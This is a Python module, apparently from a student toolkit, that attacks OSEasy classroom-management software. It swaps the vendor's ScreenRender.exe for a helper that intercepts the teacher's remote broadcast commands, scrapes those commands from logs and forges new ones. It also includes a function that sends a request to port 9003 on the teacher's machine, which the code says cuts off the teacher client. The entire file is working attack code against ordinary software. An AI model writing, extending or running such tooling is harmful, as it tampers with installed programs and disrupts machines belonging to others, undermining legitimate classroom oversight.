# src/modules/broadcast_handler.py
# 广播/屏幕渲染处理

import os
import re
import time
import urllib.request

from config import SOURCE_NAME
from src.core.runtime_config import toolkit_cfg
from src.core.helpers import file_exists, run_sigle_cmd, get_ipv4_address
from src.modules.killer import ensure_killer_running


def replace_screen_render() -> bool:
    """替换原有scr用于拦截远程命令"""
    filename = "ScreenRender_Helper.exe"
    nowcurhelper = os.path.join(os.getcwd(), filename)
    copypath = os.path.join(toolkit_cfg.oseasy_path, filename)

    ensure_killer_running()
    if not file_exists(nowcurhelper):
        return False

    run_sigle_cmd(f'rename "{toolkit_cfg.oseasy_path}ScreenRender.exe" "ScreenRender_Y.exe"')
    time.sleep(2.5)
    run_sigle_cmd(f'copy "{nowcurhelper}" "{copypath}"')
    time.sleep(2.5)
    run_sigle_cmd(
        f'rename "{toolkit_cfg.oseasy_path}ScreenRender_Helper.exe" "ScreenRender.exe"'
    )
    return True


def restone_screen_render() -> bool:
    """还原原有的ScreenRender"""

    ensure_killer_running()
    path = f"{toolkit_cfg.oseasy_path}ScreenRender.exe"

    a = check_replace_screen_render_status()
    if a == False:
        return False

    try:
        os.remove(path)
    except FileNotFoundError:
        pass
    run_sigle_cmd(f'rename "{toolkit_cfg.oseasy_path}ScreenRender_Y.exe" "ScreenRender.exe"')

    return True


def check_replace_screen_render_status() -> bool:
    """通过检查SCR_Y是否存在
    来检查是否已经完成替换拦截程序
    返回True/False"""
    check_path = f"{toolkit_cfg.oseasy_path}ScreenRender_Y.exe"
    return file_exists(check_path)


def from_log_file_get_remote_cmd() -> str | None:
    """从文件中读取拦截到的远程命令
    未读取到返回None"""
    return toolkit_cfg.get_config_key_data("broadcast_cmd")


def parse_screenrender_log():
    """
    读取 `%appdata%/Mmc/ScreenRender.log` 文件，
    筛选符合特定格式的日志，
    并返回替换 " 为 # 的日志命令部分。

    `Returns`
        `list`: 包含处理后的命令部分的列表。
    """
    from src.core.helpers import show_snack
    # 获取 %appdata% 路径
    appdata_path = os.getenv("APPDATA")
    if not appdata_path:
        show_snack("无法获取 %APPDATA% 路径")
        return False, []

    log_path = os.path.join(appdata_path, "Mmc", "ScreenRender.log")
    if not os.path.exists(log_path):
        show_snack(f"日志文件不存在: {log_path}")
        return False, []

    # 匹配特定格式的正则表达式
    pattern = re.compile(r"\d{2}-\d{2} \d{2}:\d{2}:\d{2} (\{.*\})")

    result = []

    try:
        with open(log_path, "r", encoding="gbk") as log_file:
            for line in log_file:
                match = pattern.search(line)
                if match:
                    command = match.group(1)
                    # 替换 " 为 #
                    processed_command = command.replace('"', "#")
                    result.append(processed_command)
    except Exception as e:
        show_snack(f"读取日志文件时发生错误: {e}")
        return False, []

    if len(result) == 0:
        return False, []

    return True, result


def save_scr_log_cmd_to_file(log_list=None) -> None:
    """传入`parse_screenrender_log`函数返回的命令列表
    或直接调用
    保存广播命令日志中的命令到文件"""

    if log_list == []:
        return
    elif log_list is None:
        status, log_list = parse_screenrender_log()
        if not status:
            return
        return save_scr_log_cmd_to_file(log_list)

    path = os.getcwd() + "\\" + "scr_log_cmd.txt"
    with open(path, "w") as f:
        f.write("\n".join(log_list))


def extract_yc_cmd_from_log() -> None:
    """从 ScreenRender 日志中提取最近一条广播命令并保存"""

    status, log_list = parse_screenrender_log()
    if not status:
        return

    save_scr_log_cmd_to_file(log_list)

    handin_save_yc_cmd(log_list[-1], replace_ip=False)


def handin_save_yc_cmd(save_cmd, replace_ip=True) -> None:
    """手动保存拦截的命令"""
    from src.core.helpers import show_snack

    if replace_ip:
        localIp = get_ipv4_address()
        show_snack(f"已自动替换本地IP地址为{localIp}")
        save_cmd = re.sub(r"(#local#:)(#.*?#)", rf"\1#{localIp}#", save_cmd)

    toolkit_cfg.set_config_key_data("broadcast_cmd", save_cmd)


def generate_remote_cmd_and_save(teacher_ip) -> None:
    """生成拦截的命令并保存"""
    from src.core.helpers import show_snack
    localIp = get_ipv4_address()

    cmd_base = "{#decoderName#:#h264#,#fullscreen#:0,#local#:#172.18.36.132#,#port#:7778,#remote#:#229.1.36.200#,#teacher_ip#:0,#verityPort#:7788}"

    save_cmd = re.sub(r"(#local#:)(#.*?#)", rf"\1#{localIp}#", cmd_base)
    save_cmd = re.sub(r"(#remote#:)(#.*?#)", rf"\1#{teacher_ip}#", save_cmd)

    toolkit_cfg.set_config_key_data("broadcast_cmd", save_cmd)

    print("[DEBUG]", save_cmd)

    show_snack(
        f"已尝试按照模板生成广播命令\n若无法使用请使用拦截方案获取命令"
    )


def build_run_broadcast_cmd(YC_command) -> str:
    """构造执行显示命令"""

    status = check_replace_screen_render_status()
    if status == True:
        fdb = f'"{toolkit_cfg.oseasy_path}ScreenRender_Y.exe" {YC_command}'
        return fdb
    else:
        fdb = f'"{toolkit_cfg.oseasy_path}ScreenRender.exe" {YC_command}'
        return fdb


def save_now_broadcast_cmd() -> bool | None:
    """保存现在获取到的远程指令到程序目录"""
    savepath = os.getcwd() + "\\" + "command.txt"

    cmd = toolkit_cfg.get_config_key_data("broadcast_cmd")
    if not cmd:
        return False

    with open(savepath, "w") as f:
        f.write(cmd)
    return True


def try_get_teacher_ip() -> str | None:
    """尝试从广播命令中提取教师机IP"""
    bdcmd = toolkit_cfg.get_config_key_data("broadcast_cmd")

    if not bdcmd:
        return None

    # 匹配被 # 包裹的IPv4地址
    pattern = r"#(\d{1,3}(?:\.\d{1,3}){3})#"
    ips = re.findall(pattern, bdcmd)
    try:
        ip = ips[1]
        return ip
    except IndexError:
        return None


def blow_teacher_client():
    from src.core.helpers import show_snack
    ip = try_get_teacher_ip()
    if ip is None:
        show_snack("未获取到教师机IP")
        return
    headers = {
        "User-Agent": SOURCE_NAME
    }
    uri = "http://" + ip + ":9003"
    req = urllib.request.Request(uri, headers=headers)
    try:
        res = urllib.request.urlopen(req, timeout=5)
        tip = "教师端返回了无效的响应" if res.status != 400 \
            else "已断开教师端的连接\n可能需要约10秒生效"
        res.close()
    except Exception as e:
        tip = f"请求失败: {e}"
    show_snack(tip)